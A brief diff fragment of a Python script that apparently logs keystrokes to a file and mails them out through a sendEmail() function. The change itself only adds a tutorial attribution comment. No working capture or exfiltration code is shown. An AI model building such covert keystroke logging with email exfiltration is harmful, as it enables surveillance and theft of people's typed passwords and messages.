@@ -40,6 +40,7 @@ def writeToFile():
             file.write(key)
         keys.clear()
 
+# Sourced from https://www.geeksforgeeks.org/send-mail-gmail-account-using-python/
 def sendEmail():
     
     # Instance of MIMEMultipart 
